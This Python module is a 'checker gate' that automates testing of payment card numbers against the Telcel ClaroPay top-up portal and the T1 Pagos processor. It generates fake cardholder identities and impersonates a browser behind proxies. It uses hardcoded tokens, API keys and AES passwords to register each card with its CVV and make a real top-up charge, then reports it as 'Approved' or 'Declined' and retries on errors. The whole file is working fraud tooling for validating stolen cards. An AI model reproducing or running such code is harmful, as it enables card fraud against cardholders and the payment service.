# Pure gate motor for 'zb' — no Telegram-bot dependency.

import re, json, uuid, base64, random, secrets, time, hashlib, datetime, types

from faker import Faker

from curl_cffi import requests as curl

from Crypto.Cipher import AES

from Crypto.Util.Padding import pad, unpad

_ZB_KBD_MONTOS = [('10', '🟢'), ('20', '🟢'), ('30', '🟢'), ('50', '🟡'), ('80', '🟡'), ('100', '🟡'), ('150', '🔴'), ('200', '🔴'), ('300', '🔴'), ('500', '🔴')]

def _mask(card_s):
    n = card_s.split('|')[0] if '|' in card_s else card_s
    return f'{n[:6]}·····{n[-4:]}' if len(n) > 10 else f'{n[:4]}···'

_GATEWAY = 'Telcel ClaroPay / T1 Pagos'

_T1_JWT = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI0IiwianRpIjoiZjNhM2I4MjMwMWI1NzcyZDVmYjk2MThkZWZhNTZkY2M3ZmUxNDcwNDE1MzA0YTU5ZjIxNDgyOTBlZjZkMjgxNTM1MGRiYTY1OWQ3NzMzYzgiLCJpYXQiOjE3NzY3Mjc4MDQuMDA4MDMsIm5iZiI6MTc3NjcyNzgwNC4wMDgwMzIsImV4cCI6MTgzOTg4NjIwNC4wMDM5MDYsInN1YiI6IjcxIiwic2NvcGVzIjpbImNsaWVudGUtdGFyamV0YXMiLCJjbGllbnRlLWNsaWVudGVzIl19.kKYlWwJSK_ImR5mNtbHFKxzAnBK2srW6zMVxOmhrcET4L99yRWuXEnMLU_yHJThJtnCvlKeLhH9X5FfUOA1thdqdEXneYDpQabBuOn5lC7mgpZbsq6JSKs7hZ3PJabMTAkDalaTrBhlGehFU4P_VMlWSGo6EBuBs1-5c7IO-nevbJ9bMtDFB33CPAIGVsKQlefgxkAe70sP-vUP5r2uv0QaUiWS3PdOJ0UGwYYUlp0rDX54xNj9BH-2PfvsSxi99l-jzJ30_topOlpRlFGkld6xeJn_k7iH4M5FSk0EfcTedbMn6QCZtyh6k4UahWLLnk_aH8_BwkzUsr1PZaz8szDR5lP_s43-NgC8-Po41f3tJsmtB9L8pN3TYzF9Vpd4E2Gj321HLi1q2wwRgZnadAmlPq6_GyDzUkRfm0_J6nh7C21OFUnAn2sakCV_8SC6_vwHm2EhITNuFOauAlYwXyx6BttIUsPbm6U4QwPWg_YYZOkc_dnQ-YduUUSipsTwujB68ZFwbX8JB-bg9y_0ILsNhwoRtd98h3AUGff_oeYnhPKUt5VRwqKBpU9xhfx7-tQV5zVQU_jgPud9Y9FGTlE1nQsX6QQ9oi6gyKbb0df9JBvBr0_nZBxCYs0R5uRTwV7drIfexzFUtKAIK6RCrwWidbvWuE3fGEUtnOojhaeg'

_API_KEYS = {'portal': 'gzvLzMHmJ9a0wyi2v2nJSaIa3KUfExtP7Qy7rN8I', 'userinfo': 'osMTzNopOYHcdzTiZgZGNoIkZZFUyoRnOcxsrJeE', 'profile': 'l4bWfF3rrS6nKv21UjW2U3Lfin0PCRuE2nJacVGP', 'cardmgmt': 'S3rHhMdo391x1SUJ32uAy9LBc0CFZPqh8TGjoZi3', 'commission': 'DgZNQ7eYRj1LU9THB6z7g1V4pUXSJRXuaMmvJYiR'}

_MONTOS = {'10': ('266', 'Recarga $10', 7), '20': ('236', 'Recarga $20', 10), '30': ('267', 'Recarga $30', 15), '50': ('238', 'Recarga $50', 30), '80': ('268', 'Recarga $80', 30), '100': ('239', 'Recarga $100', 60), '150': ('240', 'Recarga $150', 60), '200': ('241', 'Recarga $200', 60), '300': ('242', 'Recarga $300', 60), '500': ('243', 'Recarga $500', 60)}

_FALLBACK_PHONE = '4437292165'

class Utility:
    _AES_PASSWORD = 'pd2oQTuQ6AFuFVAF'
    _MARK_MAP = {'4': '1', '5': '2', '3': '3', '6': '4'}
    _BRAND_MAP = {'4': 'visa', '5': 'mastercard', '3': 'amex', '6': 'discover'}

    @staticmethod
    def generateFakeProfile() -> types.SimpleNamespace:
        fake, p = (Faker('en_US'), Faker('en_US').profile())
        firstName = p['name'].split()[0]
        lastName = p['name'].split()[-1]
        return types.SimpleNamespace(name=f'{firstName} {lastName}', mail=f'{firstName}.{lastName}{random.randint(0, 999)}@gmail.com')

    @staticmethod
    def parseCard(raw: str) -> dict:
        num, month, year, cvv = re.split('[\\s|/]+', raw.strip())
        year4 = year if len(year) == 4 else f'20{year}'
        return {'number': num, 'month': month.zfill(2), 'year4': year4, 'year2': year4[-2:], 'cvv': cvv, 'bin': num[:6], 'last4': num[-4:], 'expDate': month.zfill(2) + year4[-2:], 'mark': Utility._MARK_MAP.get(num[0], '2'), 'brand': Utility._BRAND_MAP.get(num[0], 'mastercard')}

    @staticmethod
    def buildPhoneData(raw: str) -> str:
        digits = re.sub('\\D', '', str(raw)).removeprefix('00').removeprefix('52')
        if len(digits) != 10:
            raise ValueError(f'Número inválido: {digits!r}')
        return digits

    @staticmethod
    def encryptPayload(plaintext: str) -> str:
        salt = secrets.token_bytes(16)
        key = hashlib.pbkdf2_hmac('sha256', Utility._AES_PASSWORD.encode(), salt, 250000, dklen=32)
        iv = secrets.token_bytes(16)
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext.encode('utf-8'), 16))
        return f'{base64.b64encode(salt).decode()}|{base64.b64encode(iv).decode()}|{base64.b64encode(ct).decode()}'
    _ACTINIUM_PASS = 'ranDlathEMYraTEFulINmAgi'

    @staticmethod
    def decryptPayload(payload: str) -> str:
        salt_b64, iv_b64, ct_b64 = payload.split('|')
        salt = base64.b64decode(salt_b64)
        iv = base64.b64decode(iv_b64)
        ct = base64.b64decode(ct_b64)
        key = hashlib.pbkdf2_hmac('sha256', Utility._ACTINIUM_PASS.encode(), salt, 250000, dklen=48)
        pt = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ct)
        return unpad(pt, 16).decode('utf-8')

def processTelcel(cardInput: str, phone: str=None, monto: str='10', proxy=None, retries: int=0) -> dict:
    if not phone:
        phone = _FALLBACK_PHONE
    if monto not in _MONTOS:
        monto = '10'
    product_id = _MONTOS[monto][0]
    model = curl.Session(impersonate='firefox147')
    data = Utility.generateFakeProfile()
    card = Utility.parseCard(cardInput)
    number = Utility.buildPhoneData(phone)
    model.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
    try:
        headers1 = {'Accept': 'application/json, text/plain, */*', 'x-api-key': _API_KEYS['portal'], 'cp-bi': 'com.claropay.web.portalpagos', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/'}
        request1 = model.get(f'https://pay.telcel.com/api/actinium?a=+{number}', headers=headers1)
        if not request1.json().get('data', {}):
            raise Exception(f'Numero inexistente')
        cipher_data = request1.json()['data']
        decrypted = Utility.decryptPayload(cipher_data)
        act_json = json.loads(decrypted)
        firebase_jwt = act_json['tokensDTO']['access_token']
        headers2 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['userinfo'], 'Authorization': f'Bearer {firebase_jwt}'}
        request2 = model.get(f'https://api.claropay.com/cached/v2/oauth2/userinfo?token={firebase_jwt}', headers=headers2)
        claro_id = request2.json().get('sub') or request2.json().get('claro-profile.person.claroid')
        headers3 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['profile'], 'Authorization': f'Bearer {firebase_jwt}'}
        request3 = model.get(f'https://api.claropay.com/claroid/profile/cardCustomer?query=findCustomerIDs&claroId={claro_id}', headers=headers3)
        existing_customers = request3.json().get('data', [])
        customer_id = existing_customers[0].get('customerId') if existing_customers else None
        if not customer_id:
            headers4 = {'Accept': '*/*', 'Authorization': f'Bearer {_T1_JWT}', 'Content-Type': 'application/json', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/'}
            request4 = model.post('https://api-claropay.t1pagos.com/v1/cliente', headers=headers4, json={'id_externo': claro_id})
            if request4.json().get('status') != 'success':
                raise Exception(f'T1 /v1/cliente error: {request4.text[:150]}')
            customer_id = request4.json()['data']['cliente']['id']
        headers5 = {'Accept': '*/*', 'Authorization': f'Bearer {_T1_JWT}', 'Content-Type': 'application/json', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/'}
        payload5 = {'cargo_unico': False, 'cvv2': card['cvv'], 'default': False, 'expiracion_anio': card['year2'], 'expiracion_mes': card['month'], 'nombre': data.name, 'pan': card['number'], 'cliente_id': customer_id}
        request5 = model.post('https://api-claropay.t1pagos.com/v1/tarjeta', headers=headers5, json=payload5)
        j5 = request5.json()
        if j5.get('status') != 'success':
            raise Exception(f'T1 /v1/tarjeta error: {request5.text[:150]}')
        card_token = j5['data']['tarjeta']['token']
        headers6 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['profile'], 'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com', 'cp-bv': '4.110.103', 'cp-so': 'web'}
        payload6 = {'email': f'cp-0000000000-{uuid.uuid4()}@claropay.com', 'customer': {'claroId': claro_id, 'personId': claro_id, 'processor': 't1pagos', 'customerId': customer_id}}
        model.post('https://api.claropay.com/claroid/profile/cardCustomer', headers=headers6, json=payload6)
        headers7 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['cardmgmt'], 'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com', 'cp-bv': '4.110.103', 'cp-so': 'web'}
        payload7 = {'msisdn': '0000000000', 'externalId': str(uuid.uuid4()), 'card': {'tokens': [{'platform': '1', 'value': card_token}], 'expirationDate': card['expDate'], 'lastDigits': card['last4'], 'bin': card['bin'], 'mark': card['mark'], 'acceptTermsAndConditions': True}, 'deviceData': None, 'canDeviceData': False, 'latitude': '0.0', 'longitude': '0.0', 'appVersion': '1.0', 'claroId': claro_id, 'name': data.name, 'isDefault': '0', 'cardName': ''}
        request7 = model.post('https://api.claropay.com/prod-card-mgnt/cardmanagement/v3/createCard', headers=headers7, json=payload7)
        if request7.json().get('responseCode') != 0:
            raise Exception(f'createCard error: {request7.text[:150]}')
        card_id = request7.json()['cardId']
        payload8 = {'appVersion': '1.0', 'externalId': str(uuid.uuid4()), 'claroId': claro_id, 'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'}
        request8 = model.post('https://api.claropay.com/prod-card-mgnt/cardmanagement/v1/searchCard', headers=headers7, json=payload8)
        card_list = request8.json().get('cardList', [])
        sc_card = next((c for c in card_list if c.get('cardId') == card_id), card_list[0] if card_list else {})
        sc_card_data = sc_card.get('card', {})
        sc_created = sc_card.get('creationDate', 0)
        headers9 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['commission'], 'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com'}
        payload9 = {'serviceId': '143', 'merchantId': '', 'amount': monto, 'isClaroPay': 'false', 'cardId': card_id, 'appVersion': '4.110.103', 'isClaroPartner': 'false'}
        _saved9 = model.proxies
        model.proxies = None
        try:
            model.post('https://apps.claropay.com:11616/prod-CalculadoraComisiones/commissions/calculateCommission', headers=headers9, json=payload9)
        except Exception:
            pass
        finally:
            model.proxies = _saved9
        model.get(f'https://api.claropay.com/claroid/profile/cardCustomer?query=findCustomerIDs&claroId={claro_id}', headers=headers3)
        request8b = model.post('https://api.claropay.com/prod-card-mgnt/cardmanagement/v1/searchCard', headers=headers7, json={'appVersion': '1.0', 'externalId': str(uuid.uuid4()), 'claroId': claro_id, 'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'})
        card_list2 = request8b.json().get('cardList', [])
        sc_card2 = next((c for c in card_list2 if c.get('cardId') == card_id), card_list2[0] if card_list2 else sc_card)
        sc_card_data = sc_card2.get('card', sc_card_data)
        sc_created = sc_card2.get('creationDate', sc_created)
        headers11 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['cardmgmt'], 'Authorization': f'Bearer {firebase_jwt}'}
        payload11 = {'appVersion': '4.70.908', 'externalId': str(uuid.uuid4()), 'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'}
        request11 = model.post('https://api.claropay.com/prod-card-mgnt/cardmanagement/v1/getSessionTags', headers=headers11, json=payload11)
        if request11.json().get('responseCode') != 0:
            raise Exception(f'getSessionTags error: {request11.text[:150]}')
        session_id = request11.json()['sessionTagInformation']['webSessionId']
        ts_ms = int(time.time() * 1000)
        sc_merged = {**{k: v for k, v in sc_card_data.items() if k not in ('bin', 'msisdn')}, 'bins': sc_card_data.get('bin', card['bin']), 'cvv': card['cvv']}
        try:
            creation_date = datetime.datetime.fromtimestamp(sc_created / 1000, tz=datetime.timezone.utc).strftime('%Y-%m-%d')
        except Exception:
            creation_date = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d')
        payload12 = json.dumps({'accountHolder': {'accountCreateWebSessionID': '', 'accountCreationDate': creation_date, 'accountHolderAddress': {'city': '', 'countryCodeId': '484', 'externalNumber': '', 'internalNumber': '', 'postalCode': '', 'region': '', 'street': '', 'suburb': ''}, 'birthdate': '', 'card': sc_merged, 'firstName': '', 'governmentId': {'idNumber': '', 'idType': '2'}, 'lastName': '', 'secondLastName': ''}, 'appVersion': '1.0', 'checkPayment': True, 'claroId': claro_id, 'clientIdT1': customer_id, 'destinationAccountId': number, 'deviceFingerprint': f'_0000000000_{secrets.token_hex(16)}_{ts_ms}', 'externalId': str(uuid.uuid4()), 'inquiryTelmexId': '', 'isClaroSocio': False, 'latitude': '0.0', 'longitude': '0.0', 'makePayment': True, 'msisdn': '0000000000', 'paymentChannel': 7, 'paymentDescription': 'Pago desde portal telcel', 'paymentRoute': '1', 'productId': product_id, 'serviceId': '143', 'serviceName': 'Telcel', 'sessionId': session_id, 'totalAmount': str(monto), 'totalCommission': '0'}, separators=(',', ':'))
        headers12 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/', 'Content-Type': 'application/json', 'x-api-key': _API_KEYS['portal'], 'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com', 'cp-bv': '4.110.103', 'cp-so': 'web'}
        request12 = model.post('https://api.claropay.com/be-portal-pagos/portalPagosRest/t1Payment', headers=headers12, json={'data': Utility.encryptPayload(payload12)})
        r12 = request12.json()
        code = r12.get('responseCode', -1)
        msg = r12.get('responseMessage') or r12.get('responseStatus', {}).get('desc', '')
        msg_type = r12.get('messageType', -1)
        prod_id, prod_desc, prod_days = _MONTOS[monto]
        product = {'productId': prod_id, 'monto': f'${monto}', 'descripcion': prod_desc, 'dias': prod_days}
        card_str = f"{card['number']}|{card['month']}|{card['year4']}|{card['cvv']}"
        if code == 0:
            return {'status': True, 'success': True, 'card': card_str, 'response': 'TRANSACCION_EXITOSA', 'apiResponse': 'Approved ✅', 'retries': retries, 'messageType': msg_type, 'product': product, 'gateway': _GATEWAY}
        else:
            return {'status': True, 'success': False, 'card': card_str, 'response': msg or 'GENERIC_DECLINE', 'apiResponse': 'Declined ❌', 'retries': retries, 'messageType': msg_type, 'product': product, 'gateway': _GATEWAY}
    except Exception as Error:
        if retries <= 3:
            return processTelcel(cardInput, phone, monto, proxy, retries + 1)
        card_str = f"{card['number']}|{card['month']}|{card['year4']}|{card['cvv']}"
        return {'status': True, 'success': False, 'card': card_str, 'response': str(Error)[:200], 'apiResponse': 'Max Retries ❌', 'retries': retries, 'gateway': _GATEWAY}

def _checker(cc, binData, phone=None, monto='10', proxy=None):
    try:
        card_input = f'{cc[0]}|{cc[1]}|{cc[2]}|{cc[3]}'
        phone_use = phone or (cc[4] if len(cc) > 4 else _FALLBACK_PHONE)
        r = processTelcel(cardInput=card_input, phone=phone_use, monto=monto, proxy=proxy)
        prod = r.get('product', {})
        desc = prod.get('descripcion', '')
        resp = r.get('apiResponse', r.get('response', ''))
        msg = r.get('response', '')
        full = f'{resp} | {msg}' + (f' | {desc}' if desc and desc not in msg else '')
        return {'status': True, 'success': r.get('success', False), 'response': full[:200]}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '') or None
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}